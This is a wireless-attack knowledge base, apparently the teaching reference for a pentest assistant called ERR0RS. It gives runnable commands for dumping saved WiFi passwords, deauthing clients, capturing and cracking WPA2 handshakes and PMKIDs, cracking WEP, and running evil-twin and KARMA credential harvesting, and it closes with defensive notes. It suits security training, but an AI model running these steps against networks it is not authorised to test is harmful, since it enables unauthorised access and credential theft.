# ERR0RS Wireless Attack Knowledge Base
**Category:** Wireless Security | **Author:** Eros (Gary Holden Schneider) | **Version:** 1.0

---

## OVERVIEW

This document covers wireless attack methodology, tool usage, correct tool selection
for each scenario, and the critical distinctions between attack surfaces.
ERR0RS uses this as its teaching reference for all wireless-related queries.

---

## SECTION 1 — CRITICAL TOOL SELECTION GUIDE

### The #1 Rule: Right Tool for the Right Attack Surface

ERR0RS must always match the tool to the attack surface. This is the most common
source of confusion for students.

| Attack Surface | Correct Tools | WRONG Tool |
|---|---|---|
| WiFi WPA2 handshake cracking | aircrack-ng, hashcat (-m 22000) | Mimikatz |
| WiFi password already saved on Windows | netsh wlan | Mimikatz, aircrack |
| Windows domain credential dumping | Mimikatz | aircrack, hashcat |
| Windows local account NTLM hashes | Mimikatz, impacket secretsdump | aircrack |
| WPA2 PMKID attack | hcxtools + hashcat | Mimikatz |
| Rogue AP / evil twin | hostapd-wpe, WiFi Pineapple | Mimikatz |

**Why Mimikatz CANNOT crack WiFi passwords:**
Mimikatz targets Windows authentication protocols — NTLM hashes, Kerberos tickets,
WDigest credentials, DPAPI keys. These live inside lsass.exe (Windows Local Security
Authority). WiFi WPA2 uses PBKDF2-HMAC-SHA1 key derivation — a completely different
algorithm stored in a completely different place. Mimikatz has zero modules for WPA2.

---

## SECTION 2 — RECOVERING SAVED WIFI PASSWORDS (Already Connected Machine)

### Scenario: You have access to a Windows machine that previously connected to the WiFi

This is the FASTEST path if you already have system access. No cracking needed.

**List all saved WiFi profiles:**
```
netsh wlan show profiles
```

**Dump the plaintext password for a specific profile:**
```
netsh wlan show profile name="NetworkNameHere" key=clear
```
Look for the line: `Key Content : YourPasswordHere`

**Dump ALL saved WiFi passwords in one shot (PowerShell):**
```powershell
(netsh wlan show profiles) |
  Select-String "All User Profile" |
  ForEach-Object {
    $n = ($_ -split ":")[1].Trim()
    netsh wlan show profile name="$n" key=clear |
      Select-String "Key Content"
  }
```

**Why this works:** Windows stores WiFi profiles encrypted under DPAPI tied to the
machine. Running netsh as an admin user decrypts and shows them in plaintext.
No cracking, no handshakes — just Windows doing the work for you.

**Linux equivalent (if NetworkManager):**
```bash
cat /etc/NetworkManager/system-connections/*.nmconnection | grep psk
```

---

## SECTION 3 — WPA2 HANDSHAKE CAPTURE AND CRACKING

### The Actual "Hacking WiFi" Workflow

**What is a WPA2 4-way handshake?**
When a client connects to a WPA2 network, a 4-packet exchange occurs between
the client and the AP. This handshake contains a cryptographic proof that the
client knows the password — WITHOUT sending the password itself. We capture this
and crack it offline.

**The handshake is NOT the password.** It is:
  PBKDF2-HMAC-SHA1(password + SSID, 4096 iterations) → PMK → PTK derivation

To "crack" it means trying passwords from a wordlist until one produces a matching PTK.

---

### Step 1 — Put adapter into monitor mode

```bash
# Identify your wireless interface
iwconfig

# Kill interfering processes
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0
# Interface is now wlan0mon
```

**Requirements:** Adapter MUST support monitor mode and packet injection.
- Alfa AWUS036ACM (MT7612U) — Tier 1, dual-band, excellent injection ✅
- Alfa AWUS036NHA (AR9271) — single band 2.4GHz, rock solid ✅
- Built-in laptop WiFi — usually does NOT support monitor mode ❌

---

### Step 2 — Survey the area and pick a target

```bash
# Scan all nearby APs
airodump-ng wlan0mon

# Lock onto a specific AP (note BSSID and CH first)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c = channel, --bssid = target AP MAC, -w = output file prefix
```

Leave this running. You need a client to connect (or reconnect) to capture the handshake.

---

### Step 3 — Capture the handshake

**Option A — Wait for a natural connection (passive, stealthy)**
Just leave airodump-ng running. When any client connects to the AP, you get it.

**Option B — Force a reconnect with deauth (faster, active, detectable)**
```bash
# In a second terminal — send deauth to a specific client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauth, 5 = number of packets, -a = AP BSSID, -c = client MAC
```
The client briefly disconnects and reconnects — triggering the 4-way handshake.
Watch the airodump-ng window for `WPA handshake: AA:BB:CC:DD:EE:FF` in the top right.

---

### Step 4 — Convert and crack with hashcat

```bash
# Convert .cap to hashcat format (22000 = WPA-PBKDF2-PMKID+EAPOL)
hcxpcapngtool -o capture.hc22000 capture-01.cap

# Or use older conversion if hcxpcapngtool not available
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx rockyou.txt

# Modern method (hashcat 6.0+):
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# With rules for better coverage:
hashcat -m 22000 capture.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With mask attack (if you know password pattern, e.g. 8 digits):
hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

**Or use aircrack-ng (CPU, slower but simpler):**
```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

---

## SECTION 4 — PMKID ATTACK (clientless — no deauth needed)

Modern APs broadcast the PMKID in the first EAPOL frame. You can capture it
without needing any client connected — just proximity to the AP.

```bash
# Capture PMKIDs from all nearby APs
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

**Advantage:** No clients needed, no deauth (stealthier).
**Disadvantage:** Not all APs are vulnerable (older ones don't broadcast PMKID).

---

## SECTION 5 — WEP CRACKING (legacy, still seen in IoT/embedded)

WEP is mathematically broken. If you see it, it's trivially crackable.

```bash
# Start capture with IV collection
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Speed up IV collection with fake authentication + ARP replay
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon       # fake auth
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon          # ARP replay

# Crack once ~50,000+ IVs collected
aircrack-ng wep_capture-01.cap
```

---

## SECTION 6 — EVIL TWIN / ROGUE AP ATTACKS

Creates a fake AP cloning a legitimate one to capture credentials.

**With WiFi Pineapple Nano (ERR0RS Pineapple Studio):**
```python
from src.tools.pineapple import PineappleStudio
studio = PineappleStudio()
studio.connect(password='your_pineapple_pw')
studio.start_evil_twin_campaign(ssids=["TargetNetwork"])
studio.start_credential_harvest_campaign(portal="wifi_login", ssids=["TargetNetwork"])
loot = studio.collect_all_loot()
```

**Manual with hostapd-wpe:**
```bash
# hostapd-wpe captures WPA2-Enterprise (PEAP/MSCHAPv2) credentials
apt install hostapd-wpe
# Edit /etc/hostapd-wpe/hostapd-wpe.conf with target SSID
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

**KARMA Attack (respond to ALL probe requests):**
Client devices probe for networks they've connected to before.
KARMA makes your AP respond YES to every probe — clients auto-connect.
ERR0RS Pineapple Studio: `studio.start_karma_attack()`

---

## SECTION 7 — TOOL QUICK REFERENCE

| Tool | Purpose | Key Command |
|---|---|---|
| airmon-ng | Enable/disable monitor mode | `airmon-ng start wlan0` |
| airodump-ng | Capture packets / survey APs | `airodump-ng wlan0mon` |
| aireplay-ng | Inject packets / deauth clients | `aireplay-ng -0 5 -a BSSID wlan0mon` |
| aircrack-ng | CPU-based WPA/WEP cracking | `aircrack-ng capture.cap -w rockyou.txt` |
| hcxdumptool | PMKID capture (clientless) | `hcxdumptool -i wlan0mon -o out.pcapng` |
| hcxpcapngtool | Convert .cap to hashcat format | `hcxpcapngtool -o out.hc22000 in.pcapng` |
| hashcat -m 22000 | GPU WPA2 cracking (fast) | `hashcat -m 22000 hash.hc22000 rockyou.txt` |
| netsh wlan | Dump saved WiFi passwords (Windows) | `netsh wlan show profile name="X" key=clear` |
| hostapd-wpe | Enterprise rogue AP (PEAP capture) | `hostapd-wpe config.conf` |

---

## SECTION 8 — DEFENSE / PURPLE TEAM NOTES

**Detecting deauth attacks:** 802.11 deauth frames are unauthenticated in WPA2.
Detectors: Kismet, Wireshark filter `wlan.fc.type_subtype == 0x000c`, WIDS systems.

**WPA3 improvements:** Simultaneous Authentication of Equals (SAE) replaces
the 4-way handshake exchange — PMKID and offline dictionary attacks no longer work.
WPA3 requires forward secrecy, eliminating retroactive decryption of captures.

**Best defenses:**
- Use WPA3 where supported
- Use long random passphrases (20+ chars), NOT dictionary words
- Enable 802.11w (Management Frame Protection) to block deauth attacks
- WIDS (Wireless Intrusion Detection) to alert on rogue APs
- Enterprise: WPA2/3-Enterprise with certificates (not passwords)

---

## SECTION 9 — COMMON MISTAKES ERR0RS SHOULD CATCH AND CORRECT

1. "Use Mimikatz to crack WiFi" → WRONG. Mimikatz = Windows auth only.
   Correct answer depends on scenario:
   - Already on a Windows machine? → netsh wlan show profile key=clear
   - Have a .cap file? → hashcat -m 22000 or aircrack-ng
   - No handshake yet? → airmon-ng + airodump-ng + aireplay-ng workflow

2. "Crack WPA2 with John the Ripper" → Technically possible but hashcat
   is 10-100x faster on GPU. Always prefer hashcat for WPA2.

3. "Use aircrack for WPA2-Enterprise" → WRONG.
   Enterprise uses RADIUS/EAP — use hostapd-wpe or eaphammer for rogue AP attacks.

4. "Monitor mode on built-in laptop WiFi" → Usually fails.
   Always check: `iw phy phy0 info | grep monitor`
   If not listed under supported modes, need an external adapter (Alfa).

---
